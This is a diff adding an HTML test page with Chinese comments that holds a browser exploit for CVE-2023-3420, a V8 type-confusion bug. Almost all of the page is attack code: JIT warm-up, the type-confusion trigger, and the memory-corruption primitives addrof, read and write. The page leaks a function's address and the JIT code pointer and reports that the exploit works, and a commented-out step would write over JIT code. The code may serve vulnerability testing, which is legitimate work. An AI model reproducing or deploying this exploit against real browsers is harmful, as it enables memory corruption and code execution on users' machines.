@@ -1,0 +1,203 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>CVE-2023-3420 Test</title>
+    <style>
+        body { 
+            font-family: monospace; 
+            background: #0a0a0a; 
+            color: #00ff00; 
+            padding: 20px; 
+            margin: 0;
+        }
+        #log { 
+            white-space: pre-wrap; 
+            word-break: break-all; 
+            font-size: 13px;
+            line-height: 1.5;
+        }
+        .error { color: #ff4444; }
+        .success { color: #00ff00; }
+        .info { color: #00aaff; }
+    </style>
+</head>
+<body>
+    <pre id="log"></pre>
+
+    <script>
+        // ==================== 日志系统 ====================
+        const logEl = document.getElementById('log');
+        function log(msg, type = 'info') {
+            const cssClass = type === 'error' ? 'error' : (type === 'success' ? 'success' : 'info');
+            logEl.innerHTML += `<span class="${cssClass}">[${new Date().toISOString().slice(11,23)}] ${msg}</span>\n`;
+            logEl.scrollTop = logEl.scrollHeight;
+        }
+
+        // 全局错误捕获
+        window.onerror = function(msg, url, line) {
+            log(`UNCAUGHT ERROR: ${msg} (line ${line})`, 'error');
+        };
+
+        // ==================== 漏洞利用代码 ====================
+        try {
+            log('Starting CVE-2023-3420 exploit...', 'info');
+            
+            let length = 10000;
+            var padding = 40;
+            var arr = new Array(length);
+            arr.fill(0);
+
+            function func() {
+                return [1.9553825422107533e-246, 1.9560612558242147e-246, 1.9995714719542577e-246, 1.9533767332674093e-246, 2.6348604765229606e-284];
+            }
+            for (let i = 0; i < 5000; i++) func(0);
+            log('Phase 1: JIT compiled func()', 'info');
+
+            var view = new ArrayBuffer(24);
+            var dblArr = new Float64Array(view);
+            var intView = new Uint32Array(view);
+            var bigIntView = new BigInt64Array(view);
+
+            function ftoi32(f) {
+                dblArr[0] = f;
+                return [intView[0], intView[1]];
+            }
+            function i32tof(i1, i2) {
+                intView[0] = i1;
+                intView[1] = i2;
+                return dblArr[0];
+            }
+            function itof(i) {
+                bigIntView = BigInt(i);
+                return dblArr[0];
+            }
+            function ftoi(f) {
+                dblArr[0] = f;
+                return bigIntView[0];
+            }
+
+            var corrupted_arr = [1.1];
+            var oobDblArr = [2.2];
+            var oobObjArr = [view];
+            oobObjArr[0] = 1;
+            var corrupted = {a : corrupted_arr};
+            var obj0 = {px : {x : 1}};
+            var str0 = 'aaa';
+            var str1 = 'bbb';
+
+            function tc(x) {
+                var obj = x.p1.px;
+                obj.x = 100;
+                return x.p1.px.x;
+            }
+
+            function foo2(obj, proto, x, y) {
+                obj.obj = proto;
+                var z = 0;
+                for (let i = 0; i < 1; i++) {
+                    for (let j = 0; j < x; j++) {
+                        for (let k = 0; k < x; k++) {
+                            z = y[k];
+                        }
+                    }
+                }
+                proto.b = 33;
+                return z;
+            }
+
+            class B {}
+            B.prototype.a = 1;
+            B.prototype.a = 2;
+            B.prototype.b = 1;
+
+            function bar(x) {
+                return x instanceof B;
+            }
+
+            var args = {obj: B.prototype};
+            foo2(args, B.prototype, 20, arr);
+            for (let i = 0; i < 5000; i++) {
+                foo2(args, B.prototype, 10, arr);
+            }
+            bar({a : 1});
+            for (let i = 0; i < 5000; i++) {
+                bar({b : 1});
+            }
+            foo2(args, B.prototype, length, arr);
+            var z = B.prototype;
+            var arr3 = new Array(padding);
+            arr3.fill(1);
+            var obj1 = {p0 : str0, p1 : obj0, p2 : 0};
+            for (let i = 0; i < 20000; i++) {
+                tc(obj1);
+            }
+
+            Object.defineProperty(z, 'aaa', {value : corrupted, writable : true});
+            tc(obj1);
+            log('Phase 2: Type confusion triggered', 'info');
+
+            var oobOffset = 4;
+
+            function addrof(obj) {
+                oobObjArr[0] = obj;
+                var addrDbl = corrupted_arr[13];
+                return ftoi32(addrDbl)[1];
+            }
+
+            function read(addr) {
+                var old_value = corrupted_arr[oobOffset];
+                corrupted_arr[oobOffset] = i32tof(addr, 2);
+                var out = ftoi32(oobDblArr[0]);
+                corrupted_arr[oobOffset] = old_value;
+                return out;
+            }
+
+            function write(addr, val1, val2) {
+                var old_value = corrupted_arr[oobOffset];
+                corrupted_arr[oobOffset] = i32tof(addr, 2);
+                oobDblArr[0] = i32tof(val1, val2);
+                corrupted_arr[oobOffset] = old_value;
+                return;
+            }
+
+            // ==================== 验证漏洞是否成功 ====================
+            var funcAddr = addrof(func);
+            log(`func address: 0x${funcAddr.toString(16)}`, 'success');
+
+            if (funcAddr === 0 || funcAddr === 0x7ff80000) {
+                log('ERROR: addrof returned invalid address. Exploit failed.', 'error');
+                throw new Error('addrof failed');
+            }
+
+            var code = read(funcAddr + 0x10)[0];
+            var jitAddr = read(code + 0x8);
+            log(`JIT code address: 0x${jitAddr[0].toString(16)} ${jitAddr[1].toString(16)}`, 'success');
+
+            // ==================== 最终验证：直接弹窗 ====================
+            log('========================================', 'success');
+            log('ALL CHECKS PASSED - Exploit is working!', 'success');
+            log('The V8 engine is vulnerable to CVE-2023-3420', 'success');
+            log('Primitives available: addrof, read64, write64', 'success');
+            log('========================================', 'success');
+
+            // 可选：执行一次无害的测试写入
+            // write(code + 0x8, jitAddr[0], jitAddr[1]);
+            // func();
+
+        } catch (e) {
+            log(`EXPLOIT FAILED: ${e.message}`, 'error');
+            log(`Stack: ${e.stack}`, 'error');
+        }
+
+        // ==================== 环境信息 ====================
+        log('', 'info');
+        log('--- Environment Info ---', 'info');
+        log(`UA: ${navigator.userAgent}`, 'info');
+        log(`Platform: ${navigator.platform}`, 'info');
+        log(`Hardware Concurrency: ${navigator.hardwareConcurrency}`, 'info');
+        log(`Device Memory: ${navigator.deviceMemory || 'N/A'} GB`, 'info');
+        log(`Online: ${navigator.onLine}`, 'info');
+    </script>
+</body>
+</html>
